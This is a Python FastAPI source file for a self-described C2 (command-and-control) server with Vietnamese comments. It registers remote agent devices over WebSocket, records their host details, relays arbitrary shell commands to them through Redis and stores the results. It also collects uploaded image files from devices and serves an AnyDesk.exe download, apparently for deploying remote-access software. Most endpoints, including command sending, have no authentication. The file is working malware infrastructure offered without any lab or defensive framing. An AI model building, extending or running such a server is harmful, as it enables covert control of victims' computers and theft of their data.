"""
============================================
C2 Server - FastAPI + WebSocket + Redis
Port: 8000 (HTTP/API) | 8765 (WebSocket)
============================================
"""
import os
import sys
import json
import uuid
import asyncio
import logging
from datetime import datetime, timezone, timedelta
from contextlib import asynccontextmanager

from dotenv import load_dotenv
load_dotenv()

import redis.asyncio as redis
import bcrypt
from jose import jwt
from pydantic import BaseModel
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, Depends, Query, Response
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
import asyncpg

# ── Logging ──────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s"
)
log = logging.getLogger("c2-server")

# ── Config ───────────────────────────────────
DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://c2_admin:c2_pass@localhost:5433/c2_db")
REDIS_URL    = os.getenv("REDIS_URL", "redis://localhost:6379/0")
API_PORT     = int(os.getenv("API_PORT", "8000"))
WS_PORT      = int(os.getenv("WS_PORT", "8765"))
C2_SECRET    = os.getenv("C2_SECRET", "c2-secret-key-change-me")

# ── Global state ─────────────────────────────
pool: asyncpg.Pool = None          # type: ignore
redis_client: redis.Redis = None   # type: ignore
ws_connections: dict[str, WebSocket] = {}  # device_id -> WebSocket

# ══════════════════════════════════════════════
# DATABASE HELPERS
# ══════════════════════════════════════════════
async def get_pool() -> asyncpg.Pool:
    global pool
    if pool is None:
        pool = await asyncpg.create_pool(DATABASE_URL, min_size=2, max_size=10)
    return pool

async def db_log(p: asyncpg.Pool, device_id: str, level: str, message: str, source: str = "server"):
    await p.execute(
        "INSERT INTO logs (device_id, level, source, message) VALUES ($1,$2,$3,$4)",
        device_id, level, source, message
    )

# ══════════════════════════════════════════════
# STARTUP / SHUTDOWN
# ══════════════════════════════════════════════
@asynccontextmanager
async def lifespan(app: FastAPI):
    global redis_client, pool
    # Startup
    log.info("Connecting to Redis...")
    redis_client = redis.from_url(REDIS_URL, decode_responses=True, protocol=2)
    await redis_client.ping()
    log.info("Redis connected OK")

    pool = await asyncpg.create_pool(DATABASE_URL, min_size=2, max_size=10)
    log.info(f"Database pool created → {DATABASE_URL}")

    yield  # app runs here

    # Shutdown
    log.info("Shutting down...")
    if redis_client: await redis_client.aclose()                # type: ignore
    if pool:         await pool.close()

    log.info("Server stopped.")

app = FastAPI(title="C2 Server", version="1.0.0", lifespan=lifespan)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ══════════════════════════════════════════════
# REST API ENDPOINTS
# ══════════════════════════════════════════════
@app.get("/")
async def root():
    return {"status": "ok", "service": "C2 Server", "version": "1.0.0"}

# ══════════════════════════════════════════════
# AUTH
# ══════════════════════════════════════════════
security = HTTPBearer(auto_error=False)

class LoginRequest(BaseModel):
    username: str
    password: str

def create_token(username: str, role: str) -> str:
    payload = {
        "sub": username,
        "role": role,
        "exp": datetime.utcnow() + timedelta(hours=24),
        "iat": datetime.utcnow(),
    }
    return jwt.encode(payload, C2_SECRET, algorithm="HS256")

async def get_current_user(credentials: HTTPAuthorizationCredentials = Depends(security)):
    if not credentials:
        raise HTTPException(401, "Missing token")
    try:
        payload = jwt.decode(credentials.credentials, C2_SECRET, algorithms=["HS256"])
        return payload
    except Exception:
        raise HTTPException(401, "Invalid or expired token")

@app.post("/auth/login")
async def login(req: LoginRequest):
    p = await get_pool()
    row = await p.fetchrow(
        "SELECT username, password_hash, role FROM users WHERE username = $1 AND is_active = TRUE",
        req.username
    )
    if not row:
        raise HTTPException(401, "Invalid credentials")

    stored_hash = row["password_hash"]
    if not bcrypt.checkpw(req.password.encode(), stored_hash.encode()):
        raise HTTPException(401, "Invalid credentials")

    token = create_token(row["username"], row["role"])
    await p.execute("UPDATE users SET last_login = NOW() WHERE username = $1", req.username)
    log.info(f"User logged in: {req.username}")

    return {
        "access_token": token,
        "token_type": "bearer",
        "username": row["username"],
        "role": row["role"],
    }

@app.get("/auth/me")
async def me(user: dict = Depends(get_current_user)):
    return {"username": user["sub"], "role": user["role"]}

# ── Devices ──────────────────────────────────
@app.get("/api/devices")
async def list_devices():
    p = await get_pool()
    rows = await p.fetch("SELECT * FROM devices ORDER BY last_seen DESC")
    return [dict(r) for r in rows]

@app.get("/api/devices/{device_id}")
async def get_device(device_id: str):
    p = await get_pool()
    row = await p.fetchrow("SELECT * FROM devices WHERE device_id = $1", device_id)
    if not row:
        raise HTTPException(404, "Device not found")
    return dict(row)

@app.delete("/api/devices/{device_id}")
async def delete_device(device_id: str, user: dict = Depends(get_current_user)):
    p = await get_pool()
    row = await p.fetchrow("SELECT * FROM devices WHERE device_id = $1", device_id)
    if not row:
        raise HTTPException(404, "Device not found")
    await p.execute("DELETE FROM commands WHERE device_id = $1", device_id)
    await p.execute("DELETE FROM logs WHERE device_id = $1", device_id)
    await p.execute("DELETE FROM alerts WHERE device_id = $1", device_id)
    await p.execute("DELETE FROM devices WHERE device_id = $1", device_id)
    # Disconnect WebSocket nếu đang kết nối
    ws = ws_connections.pop(device_id, None)
    if ws:
        try: await ws.close()
        except: pass
    log.info(f"Device deleted: {device_id}")
    return {"status": "deleted", "device_id": device_id}

# ── Commands ─────────────────────────────────
@app.get("/api/commands")
async def list_commands(device_id: str = None, status: str = None, limit: int = 50):
    p = await get_pool()
    query = "SELECT * FROM commands WHERE 1=1"
    params = []
    idx = 0
    if device_id:
        idx += 1; query += f" AND device_id = ${idx}"; params.append(device_id)
    if status:
        idx += 1; query += f" AND status = ${idx}"; params.append(status)
    query += f" ORDER BY created_at DESC LIMIT ${idx+1}"; params.append(limit)
    rows = await p.fetch(query, *params)
    return [dict(r) for r in rows]

@app.post("/api/commands")
async def send_command(device_id: str = Query(...), command: str = Query(...), timeout: int = 60):
    """
    Gửi lệnh đến agent thông qua Redis pub/sub.
    Agent phải online và đã kết nối WebSocket.
    """
    p = await get_pool()

    # Kiểm tra device tồn tại
    dev = await p.fetchrow("SELECT * FROM devices WHERE device_id = $1", device_id)
    if not dev:
        raise HTTPException(404, "Device not found")
    if dev["status"] != "online":
        raise HTTPException(400, f"Device is {dev['status']}")

    cmd_id = str(uuid.uuid4())[:8]
    now = datetime.utcnow()

    # Lưu vào DB
    row = await p.fetchrow(
        """INSERT INTO commands (device_id, command_text, status, created_at, timeout_sec)
           VALUES ($1,$2,'pending',$3,$4) RETURNING command_id""",
        device_id, command, now, timeout
    )
    db_id = row["command_id"]

    # Đẩy lệnh vào Redis pub/sub để agent nhận
    payload = json.dumps({
        "command_id": cmd_id,
        "db_id": db_id,
        "command": command,
        "timeout": timeout
    })
    await redis_client.publish(f"cmd:{device_id}", payload)

    await db_log(p, device_id, "INFO", f"Command queued: {command[:100]}")

    return {"command_id": cmd_id, "db_id": db_id, "status": "queued", "device_id": device_id}

# ── Logs ─────────────────────────────────────
@app.get("/api/logs")
async def list_logs(device_id: str = None, level: str = None, limit: int = 100):
    p = await get_pool()
    query = "SELECT * FROM logs WHERE 1=1"
    params = []
    idx = 0
    if device_id:
        idx += 1; query += f" AND device_id = ${idx}"; params.append(device_id)
    if level:
        idx += 1; query += f" AND level = ${idx}"; params.append(level)
    query += f" ORDER BY created_at DESC LIMIT ${idx+1}"; params.append(limit)
    rows = await p.fetch(query, *params)
    return [dict(r) for r in rows]

# ── Alerts ───────────────────────────────────
@app.get("/api/alerts")
async def list_alerts(unread_only: bool = False, limit: int = 50):
    p = await get_pool()
    if unread_only:
        rows = await p.fetch("SELECT * FROM alerts WHERE is_read = FALSE ORDER BY created_at DESC LIMIT $1", limit)
    else:
        rows = await p.fetch("SELECT * FROM alerts ORDER BY created_at DESC LIMIT $1", limit)
    return [dict(r) for r in rows]

@app.put("/api/alerts/{alert_id}/read")
async def mark_alert_read(alert_id: int):
    p = await get_pool()
    await p.execute("UPDATE alerts SET is_read = TRUE WHERE alert_id = $1", alert_id)
    return {"status": "ok"}

# ── Stats ────────────────────────────────────
@app.get("/api/stats")
async def get_stats():
    p = await get_pool()
    online = await p.fetchval("SELECT COUNT(*) FROM devices WHERE status = 'online'")
    total_dev = await p.fetchval("SELECT COUNT(*) FROM devices")
    pending_cmds = await p.fetchval("SELECT COUNT(*) FROM commands WHERE status IN ('pending','sent','running')")
    unread_alerts = await p.fetchval("SELECT COUNT(*) FROM alerts WHERE is_read = FALSE")
    return {
        "devices_online": online,
        "devices_total": total_dev,
        "pending_commands": pending_cmds,
        "unread_alerts": unread_alerts,
        "redis_connected": redis_client is not None,
    }

@app.post("/api/upload/{device_id}")
async def upload_file(device_id: str, file: bytes = None):
    if not file:
        raise HTTPException(400, "No file data")
    import time
    d = "D:\\C2\\controller\\uploads"
    os.makedirs(d, exist_ok=True)
    path = f"{d}\\{device_id}_{int(time.time())}.jpg"
    with open(path, "wb") as f:
        f.write(file)
    log.info(f"File uploaded from {device_id}: {path}")
    return {"path": path, "size": len(file)}

@app.get("/static/AnyDesk.exe")
async def download_anydesk():
    path = "D:\\C2\\controller\\static\\AnyDesk.exe"
    with open(path, "rb") as f:
        return Response(content=f.read(), media_type="application/octet-stream", headers={"Content-Disposition": "attachment; filename=AnyDesk.exe"})

# WEBSOCKET
@app.websocket("/ws/{device_id}")
async def agent_websocket(ws: WebSocket, device_id: str):
    await ws.accept()
    ws_connections[device_id] = ws
    p = await get_pool()
    log.info(f"[WS] Device connected: {device_id}")

    # Subscribe kênh Redis cho device này
    pubsub = redis_client.pubsub()
    await pubsub.subscribe(f"cmd:{device_id}")

    try:
        # ── Nhận handshake từ agent ──
        hs = await asyncio.wait_for(ws.receive_json(), timeout=10)
        hostname    = hs.get("hostname", "unknown")
        ip_address  = hs.get("ip_address", ws.client.host if ws.client else "unknown")
        os_name     = hs.get("os_name", "unknown")
        os_version  = hs.get("os_version", "")
        cpu_cores   = hs.get("cpu_cores", 0)
        total_ram   = hs.get("total_ram_mb", 0)
        agent_ver   = hs.get("agent_version", "1.0")

        # ── Upsert device vào DB ──
        await p.execute("""
            INSERT INTO devices (device_id, hostname, ip_address, os_name, os_version,
                                 cpu_cores, total_ram_mb, agent_version, status, first_seen, last_seen)
            VALUES ($1,$2,$3,$4,$5,$6,$7,$8,'online',NOW(),NOW())
            ON CONFLICT (device_id) DO UPDATE SET
                hostname=$2, ip_address=$3, os_name=$4, os_version=$5,
                cpu_cores=$6, total_ram_mb=$7, agent_version=$8,
                status='online', last_seen=NOW()
        """, device_id, hostname, ip_address, os_name, os_version, cpu_cores, total_ram, agent_ver)

        await db_log(p, device_id, "INFO", f"Agent connected from {ip_address}")

        # ── Background task: push Redis commands to WS ──
        async def redis_listener():
            try:
                async for msg in pubsub.listen():
                    if msg["type"] == "message":
                        log.info(f"[CMD→{device_id}] {msg['data'][:100]}")
                        try:
                            await ws.send_text(msg["data"])
                            await p.execute(
                                "UPDATE commands SET status='sent', sent_at=NOW() WHERE command_id = $1 AND status='pending'",
                                int(json.loads(msg["data"]).get("db_id", 0))
                            )
                        except Exception as e:
                            log.error(f"Send error: {e}")
            except asyncio.CancelledError:
                pass

        listener_task = asyncio.create_task(redis_listener())

        # ── Main loop: nhận response từ agent ──
        while True:
            data = await ws.receive_json()
            msg_type = data.get("type", "")

            if msg_type == "heartbeat":
                await p.execute("UPDATE devices SET last_seen=NOW() WHERE device_id=$1", device_id)
                # CPU/RAM update
                cpu = data.get("cpu_percent")
                ram = data.get("ram_percent")
                if cpu is not None and ram is not None:
                    await p.execute(
                        "UPDATE devices SET metadata = jsonb_set(jsonb_set(metadata,'{cpu_percent}',to_jsonb($2::float)),'{ram_percent}',to_jsonb($3::float)) WHERE device_id=$1",
                        device_id, cpu, ram
                    )
                await ws.send_json({"type": "ack"})

            elif msg_type == "cmd_result":
                cmd_ref = data.get("command_id", "")
                output   = data.get("output", "")
                exit_code = data.get("exit_code", -1)
                # Tìm command trong DB và cập nhật
                db_id = data.get("db_id")
                if db_id:
                    await p.execute(
                        "UPDATE commands SET status='completed', output=$1, exit_code=$2, completed_at=NOW() WHERE command_id=$3",
                        output, exit_code, db_id
                    )
                await db_log(p, device_id, "INFO", f"Command completed (exit={exit_code})")

            elif msg_type == "log":
                await db_log(p, device_id, data.get("level", "INFO"), data.get("message", ""), "agent")

    except asyncio.TimeoutError:
        log.warning(f"[WS] Handshake timeout: {device_id}")
    except WebSocketDisconnect:
        log.warning(f"[WS] Disconnected: {device_id}")
    except Exception as e:
        log.error(f"[WS] Error for {device_id}: {e}")
    finally:
        listener_task.cancel()
        await pubsub.unsubscribe(f"cmd:{device_id}")
        ws_connections.pop(device_id, None)

        # Đánh dấu device offline
        try:
            await p.execute("UPDATE devices SET status='offline' WHERE device_id=$1", device_id)
            await db_log(p, device_id, "WARN", "Agent disconnected")
        except Exception:
            pass
        log.info(f"[WS] Cleanup done: {device_id}")


# ══════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════
if __name__ == "__main__":
    import uvicorn
    log.info(f"Starting C2 Server → API:{API_PORT}  WS:{WS_PORT}")
    uvicorn.run("main:app", host="0.0.0.0", port=API_PORT, reload=False, log_level="info")
